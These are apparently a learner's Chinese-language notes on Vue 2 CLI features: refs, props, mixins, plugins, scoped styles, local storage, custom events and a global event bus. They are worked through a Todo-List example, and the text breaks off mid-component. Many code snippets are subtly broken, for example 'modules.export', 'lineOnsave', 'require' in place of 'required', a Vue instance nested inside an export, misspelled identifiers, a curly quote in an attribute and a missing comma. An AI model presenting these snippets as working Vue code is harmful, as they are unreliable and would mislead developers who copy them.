==vue inspect>output.js== 可以查看到Vue脚手架的默认配置

使用vue.config.js可以对脚手架进行个性化定制，和package.json同级目录，详见 [配置参考 | Vue CLI](https://cli.vuejs.org/zh/config/#vue-config-js)

~~~js
modules.export={
  pages:{
    index:{
      entry:'src/index/main.js'  //入口
    }
  },
  lineOnsave:false  //关闭语法检查
}
~~~

# Vue CLI  ref props mixin plugin scoped

## ref属性

==ref==被用来给元素或子组件注册引用信息（id的替代者）

- 应用在==html== 标签上获取的是真实==DOM元素==，应用在组件标签上获取的是组件实例对象
- 使用方式
  - 打标识： ==<h1 ref="xxx"></h1>== 或者 ==<School ref="xxx"></School>==
  - 获取：==this.$refs.xxx==

~~~vue
<template>
	<div>
    <h1 v-text="msg" ref="title"></h1>
    <button ref="btn" @click="showBtn">点我输出上方的DOM元素</button>
    <School ref="sch"></School>
  </div>
</template>
<script>
	import School from './components/School'
  export default {
    new Vue({
    name:'App',
    components:{School},
    data(){
      return{
        msg:"欢迎学习Vue"
      }
    },
    methods:{
      showDom(){
        console.log(this.$refs.title)
        console.log(this.$refs.btn)
        console.log(this.$refs.sch)
      }
    }
  })
  }
</script>
~~~

![image-20230715133845693](assets/image-20230715133845693.png)

## props配置项

==props==让组件接收外部传过来的数据

- ​	传递数据==<Demo name="xxx" :age="18"/>== 这里age前加==：==，通过v-bind使得里面的18是数字
- 接收数据
  - 第一张方式(只接收) ==props:[‘name’,‘age’]== 
  - 第二种方式（限制类型） ==props:{name:String， age:Number}==
  - 第三种方式（限制类型、限制必要性、指定默认值）

~~~js
props:{
  name:{
    type:String,
    require:true,
    default:'Lyy'
  }
}
~~~

> 备注：`props是只读的` ，``Vue`底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制  `props` 的内容到  `data` 中，然后去修改  `data`  中的数据

`src/App.vue`

~~~Vue
<template>
	<div>
    <Student name="李四" sex="女" :age="18"></Student>
    <Student name="王五" sex="男" :age="19"></Student>
  </div>
</template>
<script>
	import Student from './components/Student.vue'
  export default {
   	name:'App',
    components:{Student}
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
	<div>
    <h1>{{msg}}</h1>
    <h1>学生姓名：{{name}}</h1>
    <h1>学生性别：{{sex}}</h1>
    <h1>学生年龄：{{myAge+1}}</h1>
    <button @click="updateAge">尝试修改收到的年龄</button>
  </div>
</template>
<script>
	export default{
    name:'Student',
    data(){
      return {
        msg:"我是一个学生",
        myAge:this.age
      }
    },
    methods:{updateAge(){this.myAge++}},
    // 简单生命接收
    props:['name','age','sex'],
    
    //接收的同时对数据进行类型限制+必要性限制+默认值指定
    props:{
      name:{
        type:String,
        require:true
      },
      age:{
        type:Number,
        default:99
      },
      sex:{
        type:String,
        require:true
      }
    }
  }
</script>
~~~

![image-20230715140320954](assets/image-20230715140320954.png)

## mixin  混入

1. ==功能：可以把多个组件工用的配置提取成一个混入对象==

2. 使用方式

   - 定义混入

   ~~~js
   const mixin = {
     data() {...},
     methods:{...}
     ...
   }
   ~~~

   - 使用混入
     - 全局混入`Vue.mixin(){xxx}`
     - 局部混入`mixin:['xxx']`

==备注==：

1. 组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”，在发生冲突时，以组件优先

~~~js
var mixin = {
  data:function(){
    return {
      message:'hello',
      foo:'abc'
    }
  }
}
new Vue({
  mixins:[mixin],
  data(){
    return {
      message:'goodbye',
      bar:'def'
    }
  },
  created(){
    console.log('this.$date')
  }
})
~~~

![image-20230715141609820](assets/image-20230715141609820.png)

2. 同名生命周期钩子将合并为一个数组，==因此都将被调用==。另外，混入对象的钩子将在组件自身钩子之前调用

   > 意思就是如果混入对象的生命周期钩子和组件的生命周期钩子同名，他们两个将合并成一个数组，
   >
   > 先运行混入对象的生命周期钩子，然后运行组建的生命周期钩子

~~~js
var mixin={
	created(){
    console.log('混入对象的钩子被调用')
  }
}
new Vue({
  mixins:[mixin],
  created(){
    console.log('组件钩子被调用')
  }
})
~~~





`src/mixin.js`

~~~js
export const hunhe = {
  methods:{
    showName(){
      alert(this.name)
    }
  },
  mounted(){
    console.log('你好啊!')
  }
}
export const hunhe2 = {
	data(){
    return {
      x:100,
      y:200
    }
  }
}
~~~

`src/components/School.vue`

~~~vue
<template>
	<div>
    <h2 @click="showName">学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
  </div>
</template>
<script>
	import {hunhe,hunhe2} from '../mixin'
  export default {
    name:'School',
    data(){
      return {
        name:'尚硅谷',
        address:"bj",
        x:666
      }
    },
    mixins:[hunhe,hunhe2]  // 局部混入
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
	<div>
    <h2 @click="showName">学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
  </div>
</template>
<script>
	import {hunhe,hunhe2} from '../mixin.js'
  export default{
    name:'Student',
    data(){
      return {
        name:'张三',
        sex:"男"
      }
    },
   mixins:[hunhe,hunhe2]
  }
</script>
~~~

`src/App.vue`

~~~vue
<template>
	<div>
    <School/>
    <hr>
    <Student/>
  </div>
</template>
<script>
	import Student from './components/Student.vue'
  import School from './components/School.vue'
  export default{
    name:'App',
    components:{Student,School}
  }
</script>
~~~

`src/main.js`

~~~js
import Vue from 'vue'
import App from './App.vue'
//import {mixin} from './mixin.js'

Vue.config.productionTip = false
// Vue.mixin(hunhe)
// Vue.mixin(hunhe2)

new Vue({
  el:"#root",
  render:h=>h(app)
})
~~~

![image-20230715144306509](assets/image-20230715144306509.png)

## plugin插件

1. 功能：用于增强Vue
2. 本质：包含`install`方法的一个对象，`install`的第一个参数是Vue，第二个以后的参数时插件使用者传递的数据
3. 定义插件（见下方src/plugin.js）
4. 使用插件Vue.use()

​	`src/plugins.js`	

```javascript
export default {
  install(Vue,x,y,z){
    console.log(x,y,z)
    //全局过滤器
    Vue.filter('mySlice',function(vulue){return value.splice(0,4)})
  
  	//定义全局指令
  	Vue.directive('fbind',{
  		//指令与元素成功绑定
  		bind(element,binding){element.value = binding.value},
			//指令所在元素插入页面时
			inserted(element,binding){element.focus()},
			//指令所在模块重新解析时
			update(element,binding){element.value=binding.value}
		})
    
    //定义混入
    Vue.mixin({
      data(){return {x:100,y:200}}
    })

		//给Vue原型上添加一个方法（vm和vc旧都能用了）
		Vue.prototype.hello = ()=>{alert('你好啊')}
  }
}
```

`src/main.js`

~~~js
import Vue from 'vue'
import App from './App.vue'
import plugins from './plugins.js'

Vue.config.productionTip = false
Vue.use(plugins,1,2,3) // 应用插件

new Vue(){
  el:'#app',
  render:h=>h(App)
}
~~~

`src/components/School.vue`

~~~vue
<template>
  <div>
    <h2>学校名称：{{ name | mySlice }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="test">点我测试一个hello方法</button>
  </div>
</template>

<script>
  export default {
    name:'School',
    data() {
      return {
        name:'尚硅谷atguigu',
        address:'北京',
      }
    },
    methods: {
      test(){
        this.hello()
      }
    },
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
  <div>
    <h2>学生姓名：{{ name }}</h2>
    <h2>学生性别：{{ sex }}</h2>
    <input type="text" v-fbind:value="name">
  </div>
</template>

<script>
  export default {
    name:'Student',
    data() {
      return {
        name:'张三',
        sex:'男'
      }
    },
  }
</script>
~~~

![image-20230715150232148](assets/image-20230715150232148.png)

## scoped样式

1. 作用：让样式在局部生效，防止冲突

2. 写法：``<style scoped>``

   > ​	`vue`中的`webpack`并没有安装最新版，导致有些插件也不能默认安装最新版，如npm i less-loader@7 而不是最新版

   `src/components/School.vue`

   ~~~vue
   <template>
     <div class="demo">
       <h2 class="title">学校名称：{{ name }}</h2>
       <h2>学校地址：{{ address }}</h2>
     </div>
   </template>
   
   <script>
     export default {
       name:'School',
       data() {
         return {
           name:'尚硅谷atguigu',
           address:'北京',
         }
       }
     }
   </script>
   
   <style scoped>
     .demo{
       background-color: skyblue;
     }
   </style>
   ~~~

   `src/components/Student.vue`

   ~~~vue
   <template>
     <div class="demo">
       <h2 class="title">学生姓名：{{ name }}</h2>
       <h2 class="atguigu">学生性别：{{ sex }}</h2>
     </div>
   </template>
   
   <script>
     export default {
       name: 'Student',
       data() {
         return {
           name: '张三',
           sex: '男'
         }
       }
     }
   </script>
   
   <style lang="less" scoped>
     .demo {
       background-color: pink;
       .atguigu {
         font-size: 40px;
       }
     }
   </style>
   ~~~

   `src/App.vue`

   ~~~vue
   <template>
     <div>
       <h1 class="title">你好啊</h1>
       <School/>
       <Student/>
     </div>
   </template>
   
   <script>
     import Student from './components/Student'
     import School from './components/School'
   
     export default {
       name: 'App',
       components: { School, Student }
     }
   </script>
   
   <style scoped>
     .title {
       color: red;
     }
   </style>
   ~~~


# VueCLI Todo-List案例

## 组件化编码流程

1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突

2. 实现动态组件：考虑好数据的存放位置，数据时一个组件在用，还是一些组件再用

   - 一个组件再用：放在组件自身即可
   - 一些组件在用：放在他们共同的父组件上(==状态提示==)

3. 实现交互：从绑定事件开始

   `props`适用于

   1. 父组件==>子组件通信
   2. 子组件==>父组件通信 （要求父组件先给子组件一个函数）

​	使用`v-model`时要切记：`v-model`绑定的值不能是`props`传来的值，因为`props`是不可以修改的只读的

​	`props`传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做

> ​	以下代码引用了bootstrap，记得引用bootstrap

`src/App.vue`

~~~vue
<template>
	<div id="root">
    <div class="todo-container">
      <div class="todo-warp">
        <MyHeader :addTodo="addTodo"/>
        <MyList :todos="todos" :checkTodo="checkTodo" :deleTodo="deleteTodo"/>
        <MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
  		</div>
  	</div>
  </div>
</template>
<script>
	import MyHeader from './components/MyHeader'
  import MyList from './components/MyList'
  import MyFooter from './components/MyFooter'
  export default {
    name:'App',
    components:{MyHeader,MyList,MyFooter},
    data(){
      return {
        // 由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
        todos:[
          {id:'001',title:'抽烟',done:true},
          {id:'002',title:'喝酒',done:false},
          {id:'003',title:'开车',done:true}
        ]
      }
    },
    methods:{
      //添加
      addTodo(todoObj){
        this.todos.unshift(todoObj)
      },
      //勾选or取消勾选一个todo
      checkTodo(id){
        this.todos.forEach((todo)=>{
          if(todo.id===id) todo.done=!todo.done
        })
      },
      //删除一个todo
      deleteTodo(id){
        this.todos=this.todos.filter(todo=>todo.id!=id)
      },
      //全选or取消全选
      checkAllTodo(done){
        this.todos.forEach((todo)=>{
          todo.done=done
        })
      },
      //清除所有已经完成的todo
      clearAllTodo(){
        this.todos=this.todos.filter((todo)=>{
          return !todo.done
        })
      }
    }
  }
</script>
<style>
  /*base*/
  body {background: #fff;}
  .btn {display: inline-block;padding: 4px 12px;margin-bottom: 0;font-size: 14px;
    line-height: 20px;text-align: center;vertical-align: middle;cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;}
  .btn-danger {color: #fff;background-color: #da4f49;border: 1px solid #bd362f;}
  .btn-danger:hover {color: #fff;background-color: #bd362f;}
  .btn:focus {outline: none;}
  .todo-container {width: 600px;margin: 0 auto;}
  .todo-container .todo-wrap {padding: 10px;border: 1px solid #ddd;border-radius: 5px;}
</style>
~~~

`src/components/MyHeader.vue`

~~~vue
<template>
	<div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车确认" v-model="title" @keyup.enter="add">
  </div>
</template>
<script>
	import {nanoid} from 'nanoid'
  export default{
    name:'MyHeader',
    props:['addTodo'],
    data(){
      return {
        title:''
      }
    },
    methods:{
      add(){
        //校验数据
        if(!this.title.trim()) return alert('输入不能为空')
        //将用户输入包装成一个todo对象
        const todoObj={id:nanoid(),title:this.title,done:false}
        // 通知App组件去添加一个todo对象
        this.addTodo(todoObj)
        //清空输入
        this.title=''
      }
    }
  }
</script>
<style scoped>
	/*header*/
	.todo-header input {width: 560px;height: 28px;font-size: 14px;
    border: 1px solid #ccc;border-radius: 4px;padding: 4px 7px;}
	.todo-header input:focus {outline: none;border-color: rgba(82, 168, 236, 0.8);
		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);}
</style>
~~~

`src/components/MyList.vue`

~~~vue
<template>
	<ul class="todo-main">
    <MyItem v-for="todoObj in todos" :key="todoObj.id" :todo="todoObj" :checkTodo="checkTodo" :deleteTodo></MyItem>
  </ul>
</template>
<script>
	import MyItem from './Myitem.vue'
  export default {
    name:'MyList',
    components:{MyItem},
    props:['todos','checkTodo','deleteTodo']
  }
</script>
<style scoped>
  /*main*/
  .todo-main {margin-left: 0px;border: 1px solid #ddd;border-radius: 2px;padding: 0px;}
  .todo-empty {height: 40px;line-height: 40px;border: 1px solid #ddd;
    border-radius: 2px;padding-left: 5px;margin-top: 10px;}
</style>
~~~

`src/components/MyItem.vue`

~~~vue
<template>
	<li>
    <label>
  <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props -->
      <!-- <input type="checkbox" v-model="todo.done"/> -->
      <input type="checkbox" v-model="todo.done">
      <span>{{todo.title}}</span>
  	</label>
    <button class="btn btn-dangeer" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>
<script>
	export default{
    name:'MyItem',
    props:['todo','checkTodo','deleteTodo'],
    methods:{
      //勾选or 取消勾选
      handleCheck(id){
        this.checkTodo(id)
      },
      //删除
      handleDelete(id){
       	if(confirm('确认删除吗？')){
          this.deleteTodo(id)
        }
      }
    }
  }
</script>
<style scoped>
  /*item*/
  li {list-style: none;height: 36px;line-height: 36px;padding: 0 5px;
    border-bottom: 1px solid #ddd;}
  li label {float: left;cursor: pointer;}
  li label li input {vertical-align:middle; margin-right:6px; position:relative;top: -1px;}
  li button {float: right;display: none;margin-top: 3px;}
  li:before {content: initial;}
  li:last-child {border-bottom: none;}
  li:hover{background-color: #ddd;}
  li:hover button{display: block;}
</style>
~~~

`src/components/MyFooter.vue`

~~~vue
<template>
	<div class="todo-footer" v-show="total">
    <label>
       <!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
      <input type="checkbox" v-model="isAll">
  	</label>
    <span>
  		<span>已完成{{doneTotal}}/全部{{total}}</span>
  	</span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>
<script>
	export default{
    name:'MyFooter',
    props:['todos','checkAllTodo','clearAllTodo'],
    computed:{
      //总数
      total(){
        return this.todos.length
      },
      //已完成数量
      doneTotal(){
        //此处使用reduce方法做条件统计
        return this.reduce((pre,todo)=>pro + (todo.done?1:0),0)
      },
      //控制全选框
      isAll:{
        get(){
          return this.doneTotal === this.total && this.total>0
        },
        // isAll被修改时set被调用
        set(value){
          this.checkAllToodo(value)
        }
      }
    },
    methods:{
       /* checkAll(e){
				this.checkAllTodo(e.target.checked)
			} */
      //清空所有已完成
      clearAll(){
        this.clearAllTodo()
      }
    }
  }
</script>
<style scoped>
  /*footer*/
  .todo-footer {height: 40px;line-height: 40px;padding-left: 6px;margin-top: 5px;}
  .todo-footer label {display: inline-block;margin-right: 20px;cursor: pointer;}
  .todo-footer label input {position: relative;top: -1px;vertical-align: middle;
    margin-right: 5px;}
  .todo-footer button {float: right;margin-top: 5px;}
</style>
~~~

![image-20230715160422136](assets/image-20230715160422136.png)

# Vue CLI 本地存储 自定义事件

## WebStorage（js本地存储）

存储内容大小一般为5MB左右(不同浏览器可能还不一样)

浏览器通过`Window.sessionStorage`和`window.localStorage`属性来实现本地存储机制

相关API

> ​	`xxxStorage.setItem('key', 'value')`该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值
>
> ​	`xxxStorage.getItem('key')`该方法接受一个键名作为参数，返回键名对应的值
>
> ​	`xxxStorage.removeItem('key')`该方法接受一个键名作为参数，并把该键名从存储中删除
>
> ​	`xxxStorage.clear()`该方法会清空存储中的所有数据

备注：

> `sessionStorage`存储的内容会随着浏览器窗口关闭消失
>
> `localStorage`存储的内容需要手动清除才会消除
>
> `xxxStorage.getItem(xxx)` 如果xxx对应的Value 获取不到，那么getItem()的返回值是`null`
>
> `JSON.parse(null)` 的结果依然是`null`

==localStorage==

~~~html
<h2>localStorage</h2>
<button onclick="saveDate()">点我保存数据</button><br/>
<button onclick="readDate()">点我读数据</button><br/>
<button onclick="deleteDate()">点我删除数据</button><br/>
<button onclick="deleteAllDate()">点我清空数据</button><br/>

<script>
  let person = {name:"JOJO",age:20}

  function saveDate(){
    localStorage.setItem('msg','localStorage')
    localStorage.setItem('person',JSON.stringify(person))
  }
  function readDate(){
    console.log(localStorage.getItem('msg'))
    const person = localStorage.getItem('person')
    console.log(JSON.parse(person))
  }
  function deleteDate(){
    localStorage.removeItem('msg')
    localStorage.removeItem('person')
  }
  function deleteAllDate(){
    localStorage.clear()
  }
</script>
~~~

==sessionStorage==

~~~html
<h2>sessionStorage</h2>
<button onclick="saveDate()">点我保存数据</button><br/>
<button onclick="readDate()">点我读数据</button><br/>
<button onclick="deleteDate()">点我删除数据</button><br/>
<button onclick="deleteAllDate()">点我清空数据</button><br/>

<script>
  let person = {name:"JOJO",age:20}

  function saveDate(){
    sessionStorage.setItem('msg','sessionStorage')
    sessionStorage.setItem('person',JSON.stringify(person))
  }
  function readDate(){
    console.log(sessionStorage.getItem('msg'))
    const person = sessionStorage.getItem('person')
    console.log(JSON.parse(person))
  }
  function deleteDate(){
    sessionStorage.removeItem('msg')
    sessionStorage.removeItem('person')
  }
  function deleteAllDate(){
    sessionStorage.clear()
  }
</script>
~~~

### 使用本地存储优化Todo-List

`src/App.vue`

~~~vue

<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader :addTodo="addTodo"/>
				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
				<MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
			</div>
		</div>
	</div>
</template>

<script>
	import MyHeader from './components/MyHeader'
	import MyList from './components/MyList'
	import MyFooter from './components/MyFooter.vue'

	export default {
		name:'App',
		components:{MyHeader,MyList,MyFooter},
		data() {
			return {
				// 🔴从本地存储中获得数据，null就创建空数组[]
				todos:JSON.parse(localStorage.getItem('todos')) || []
			}
		},
		methods: {
			//添加一个todo
			addTodo(todoObj){
				this.todos.unshift(todoObj)
			},
			//勾选or取消勾选一个todo
			checkTodo(id){
				this.todos.forEach((todo)=>{
					if(todo.id === id) todo.done = !todo.done
				})
			},
			//删除一个todo
			deleteTodo(id){
				this.todos = this.todos.filter( todo => todo.id !== id )
			},
			//全选or取消全选
			checkAllTodo(done){
				this.todos.forEach((todo)=>{
					todo.done = done
				})
			},
			//清除所有已经完成的todo
			clearAllTodo(){
				this.todos = this.todos.filter((todo)=>{
					return !todo.done
				})
			}
		},
    // 🔴数据发生改变就放到本地存储中，注意深度侦听，以及JSON转化为字符串
		watch: {
			todos:{
				deep:true,
				handler(value){
					localStorage.setItem('todos',JSON.stringify(value))
				}
			}
		},
	}
</script>
~~~

## 组件的自定义事件

1. 一种组件间通信的方式，适用于：**子组件===>父组件**

2. 使用场景：**子组件**想给**父组件**传送数据，那么就要在**父组件中给子组件绑定自定义事件**(事件的回调在A中)

3. 绑定自定义事件

   1. 第一种方式，在父组件中`<Demo @事件名=“方法”>或者<Demo v-on:事件名=“方法”>`

   2. 第二种方式：在负组件中`this.$refs.demo.$on('事件名',方法)`

      ~~~js
      <Demo ref="demo"/>
        ...
      mounted(){
        this.$ref.demo.$on('atguigu',this.test)
      }
      ~~~

      

   3. 若想让自定义事件只触发一次，可以使用**`once`**修饰符，或`$once`方法
   
   4. 触发自定义事件`this.$emit('事件名',函数)`
   
   5. 解绑自定义事件`this.$off('事件名')`
   
   6. 组件上可以绑定原生**DOM**事件需要使用`native`修饰符，`@click.native='show'`
   
      上面绑定自定义事件，即使绑定的是原生事件也被认为是自定义的，需要加`native`，加了后就将此事件给组件的根元素
   
   7. 注意：通过==`this.$refs.xxx.$on('事件名',回调函数)`==绑定自定义事件时，回调函数要么配置在methods中，要么用箭头函数，否则this指向会出问题

`src/App.vue`

~~~vue
<template>
	<div class="app">
    <h1>{{msg}},学生姓名是{{studentName}}</h1>
    <!--通过父组件给子组件传递函数类型的prop实现子给父传递数据-->
    <School :getSchoolName="getSchoolName"/>
    <!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据(第一张写法，使用@或者v-on)-->
    <!--<School @atguigu="getSchoolName" @demo="m1"/> -->
   <!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据（第二种写法，使用ref）-->
    <Student ref="student" @click.native="show"/><!-- 🔴native -->
  </div>
</template>
<script>
	import Student from './components/Student'
  import School from './components/School'
  
  export default{
    name:'App',
    components:{School,Student},
    data(){
      return {
        msg:'你好啊！',
        studentName:''
      }
    },
    methods:{
      getSchoolName(name){
        console.log('App收到了学校名',name)
      },
      getStudentName(name,...params){
        console.log('App收到了学生名',name,params)
      },
      m1(){
        console.log('demo事件被触发了！')
      },
      show(){
        alert(123)
      }
    },
    mounted(){
      this.$refs.Student.$on('atguigu',this.getStydebtBane)
    }
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
	<div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
    <button @click="add">点我number++</button>
    <button @click="sendStudentName">把学生名给App</button>
    <button @clcik="unbind">解绑atguigu事件</button>
    <button @click=“death>销毁当前Student组件的实例(vc)</button>
  </div>
</template>
<script>
	export default{
    name:"Student",
    data(){
      return {
        name:'张三',
        sex:'男',
        number:0
      }
    },
    methods:{
      add(){
        console.log('add回调被调用了')
        this.number++
      },
      sendStudentName(){
        //触发Student组件实例身上的atguigu事件
        this.$emit('atguigu',this.name,666,888,999)
        // this.$emit('demo')
        // this.$emit('click')
      },
      unbind(){
        //解绑
        this.$off('atguigu') //解绑一个自定义事件
        // this.$off(['atguigu','demo'])   //解绑多个自定义事件
        // this.$off() //解绑所有的自定义事件
      },
      death(){
        //销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全部不奏效
        this.$destroy()
      }
    }
  }
</script>
<style leng="less" scoped>
		.student{background-color: pink;padding: 5px;margin-top: 30px;}
</style>
~~~

## **使用自定义事件优化Todo-List**

`src/App.vue`

~~~vue
<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader @addTodo="addTodo"/>
				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
				<MyFooter :todos="todos" 
                  @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
			</div>
		</div>
	</div>
</template>

<script>
	import MyHeader from './components/MyHeader'
	import MyList from './components/MyList'
	import MyFooter from './components/MyFooter.vue'

	export default {
		name:'App',
		components:{MyHeader,MyList,MyFooter},
		data() {
			return {
				//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
				todos:JSON.parse(localStorage.getItem('todos')) || []
			}
		},
		methods: {
			//添加一个todo
			addTodo(todoObj){
				this.todos.unshift(todoObj)
			},
			//勾选or取消勾选一个todo
			checkTodo(id){
				this.todos.forEach((todo)=>{
					if(todo.id === id) todo.done = !todo.done
				})
			},
			//删除一个todo
			deleteTodo(id){
				this.todos = this.todos.filter( todo => todo.id !== id )
			},
			//全选or取消全选
			checkAllTodo(done){
				this.todos.forEach((todo)=>{
					todo.done = done
				})
			},
			//清除所有已经完成的todo
			clearAllTodo(){
				this.todos = this.todos.filter((todo)=>{
					return !todo.done
				})
			}
		},
		watch: {
			todos:{
				deep:true,
				handler(value){
					localStorage.setItem('todos',JSON.stringify(value))
				}
			}
		},
	}
</script>
~~~

`src/components/MyHeader.vue`

~~~vue
<template>
	<div class="todo-header">
		<input type="text" placeholder="请输入你的任务名称，按回车键确认" 
           v-model="title" @keyup.enter="add"/>
	</div>
</template>

<script>
	import {nanoid} from 'nanoid'
	export default {
		name:'MyHeader',
		data() {
			return {
				title:''	// 收集用户输入的title
			}
		},
		methods: {
			add(){
				//校验数据
				if(!this.title.trim()) return alert('输入不能为空')
				//将用户的输入包装成一个todo对象
				const todoObj = {id:nanoid(),title:this.title,done:false}
				//通知App组件去添加一个todo对象
				this.$emit('addTodo',todoObj)
				//清空输入
				this.title = ''
			}
		},
	}
</script>
~~~

`src/components/MyFooter`

~~~vue
<template>
	<div class="todo-footer" v-show="total">
		<label>
			<!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
			<input type="checkbox" v-model="isAll"/>
		</label>
		<span>
			<span>已完成{{ doneTotal }}</span> / 全部{{ total }}
		</span>
		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
	</div>
</template>

<script>
	export default {
		name:'MyFooter',
		props:['todos'],
		computed: {
			//总数
			total(){
				return this.todos.length
			},
			//已完成数
			doneTotal(){
				return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
			},
			//控制全选框
			isAll:{
				//全选框是否勾选
				get(){
					return this.doneTotal === this.total && this.total > 0
				},
				//isAll被修改时set被调用
				set(value){
					// this.checkAllTodo(value)
					this.$emit('checkAllTodo',value)
				}
			}
		},
		methods: {
			//清空所有已完成
			clearAll(){
				// this.clearAllTodo()
				this.$emit('clearAllTodo')
			}
		},
	}
</script>
~~~

# Vue CLI 全局事件总线 消息的订阅与发布

## 全局事件总线（GlobalEventBus）

**一种可以在任意组件间通信的方式**，本质上是一个对象，它必须满足以下条件

1. 所有的组件对象都必须能看见它
2. 这个对象必须能够使用`$on``$emit` `$off` 方法去绑定、触发和解绑事件

### 使用步骤

1. 定义全局事件总线

   ~~~js
   new Vue({
   	...
   	beforeCreate(){
     	Vue.prototype.$bus=this
   	},
      ...
   })
   ~~~

2. 使用事件总线

   1. 接受数据：A组件想接收数据，则在A组件中给`$bus`绑定自定义事件，时间的回调留在A组件自身

      ~~~js
      export default{
        methods:{
          demo(data){...}
        },
          mounted(){
            this.$bus.$on('xxx',this.demo)
          }
      }
      ~~~

   2. 提供数据：`this.$bus.$emit('xxx',data)`

3. 最好在`beforeDestroy`钩子中，用`$off`去解绑当前组件所用到的事件

`src/main.js`

~~~js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
  el:'#app',
  render:h=>h(App)
  beforeCreate(){
  Vue.prototype.$bus=this //安装全局事件总线 
}
})
~~~

`src/App.vue`

~~~vue
<template>
	<div class="app">
    <School/>
    <Student/>	
  </div>
</template>
<script>
	import Student from './components/Student.vue'
  import School from './components/School.vue'
  
  export default{
    name:'App',
    components:{Student,School},
  }
</script>
<style scoped>
.app{background-color: gray;padding: 5px;}
</style>
~~~

`src/components/School.vue`

~~~vue
<template>
	<div class="school">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
  </div>
</template>
<script>
	export default{
    name:'School',
    data(){
      return {
        name:'sgg',
        address:"hn"
      }
    },
    mounted(){
      this.$bus.$on('hello',(data)=>{
        console.log('我是School组件，我收到了数据',data)
      })
    },
    beforeDestroy(){
      this.$bus.$off('hello')
    }
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
	<div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <button @click="sendStudentName">把学生名给School组件</button>
  </div>
</template>
<script>
	export default{
    name:'Student',
    data(){
      return {
        name:"张三",
        sex:"男"
      }
    },
    methods:{
      sendStudentName(){
        this.$bus.$emit('demo',this.name)
      }
    }
  }
</script>
<style scoped>.student{background-color: pink;padding: 5px;margin-top: 30px;}</style>
~~~

![image-20230715173803819](assets/image-20230715173803819.png)

### 使用自定义事件优化Todo-List

`src/mian.js`

~~~ js
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false

new Vue({
  el:'#app',
  render: h => h(App),
  beforeCreate() {
    Vue.prototype.$bus = this
  },
})
~~~

`src/App.vue`

~~~vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader @addTodo="addTodo" />
        <MyList :todos="todos"/>
        <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
    </div>
    </div>
  </div>
</template>

<script>
  import MyHeader from "./components/MyHeader";
  import MyList from "./components/MyList";
  import MyFooter from "./components/MyFooter.vue";

  export default {
    name: "App",
    components: { MyHeader, MyList, MyFooter },
    data() {
      return {
        //由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
        todos: JSON.parse(localStorage.getItem("todos")) || [],
      };
    },
    methods: {
      //添加一个todo
      addTodo(todoObj) {
        this.todos.unshift(todoObj);
      },
      //勾选or取消勾选一个todo
      checkTodo(id) {
        this.todos.forEach((todo) => {
          if (todo.id === id) todo.done = !todo.done;
        });
      },
      //删除一个todo
      deleteTodo(id) {
        this.todos = this.todos.filter((todo) => todo.id !== id);
      },
      //全选or取消全选
      checkAllTodo(done) {
        this.todos.forEach((todo) => {
          todo.done = done;
        });
      },
      //清除所有已经完成的todo
      clearAllTodo() {
        this.todos = this.todos.filter((todo) => {
          return !todo.done;
        });
      },
    },
    watch: {
      todos: {
        deep: true,
        handler(value) {
          localStorage.setItem("todos", JSON.stringify(value));
        },
      },
    },
    mounted() {
      this.$bus.$on("checkTodo", this.checkTodo);
      this.$bus.$on("deleteTodo", this.deleteTodo);
    },
    beforeDestroy() {
      this.$bus.$off("checkTodo");
      this.$bus.$off("deleteTodo");
    },
  };
</script>
~~~

`src/components/MyItem.vue`

~~~vue
<template>
<li>
  <label>
    <input type="checkbox" :checked="todoObj.done" @change="handleCheck(todoObj.id)"/>
